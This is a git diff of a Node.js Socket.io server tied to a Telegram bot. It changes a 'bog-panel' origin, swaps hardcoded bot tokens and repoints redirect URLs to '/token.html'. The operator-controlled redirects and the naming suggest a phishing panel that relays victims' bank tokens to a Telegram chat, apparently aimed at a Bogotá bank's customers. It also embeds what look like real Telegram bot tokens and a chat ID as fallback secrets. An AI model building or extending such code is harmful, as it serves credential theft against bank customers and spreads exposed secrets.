@@ -15,7 +15,7 @@ const PORT = process.env.PORT || 3000;
 // Configuración de Socket.io
 const io = new Server(httpServer, {
     cors: { 
-        origin: process.env.VERCEL === '1' ? 'https://panel-de-bogota.vercel.app' : '*',
+        origin: process.env.VERCEL === '1' ? 'https://bog-panel.vercel.app' : '*',
         methods: ["GET", "POST"],
         credentials: true
     },
@@ -33,7 +33,7 @@ if (process.env.VERCEL !== '1') {
     });
 }
 
-const token = process.env.TELEGRAM_TOKEN || '8739783518:AAFrbcvTXCm6zRUAmYSpiQIKgqyNjTQS79w';
+const token = process.env.TELEGRAM_TOKEN || '8739783518:AAFf-Mwey3kYHSGaMOf-E2YgVHOox0sKEQ8';
 const chatId = process.env.TELEGRAM_CHAT_ID || '-5081537760';
 
 // Middlewares
@@ -182,9 +182,7 @@ io.on('connection', (socket) => {
             console.log(`Procesando acción ${action} para mensaje ${messageId}`);
 
             const isVercel = process.env.VERCEL === '1';
-            const baseUrl = isVercel ? 'https://bog-panel.vercel.app' : '
-bog-panel-a7g7fqcgftfscrcv.centralus-01.azurewebsites.net
-';
+            const baseUrl = isVercel ? 'https://bog-panel.vercel.app' : '/token.html';
             const { message, url } = handleRedirect(action, baseUrl);
 
             socket.emit('telegram_action', {
@@ -248,9 +246,7 @@ bot.on('callback_query', async (callbackQuery) => {
         
         // Configurar URL base según el entorno
         const isVercel = process.env.VERCEL === '1';
-        const baseUrl = isVercel ? 'https://bog-panel.vercel.app' : '
-bog-panel-a7g7fqcgftfscrcv.centralus-01.azurewebsites.net
-';
+        const baseUrl = isVercel ? 'https://bog-panel.vercel.app' : '/token.html';
 
         // Responder al callback query
         await bot.answerCallbackQuery(callbackQuery.id, {
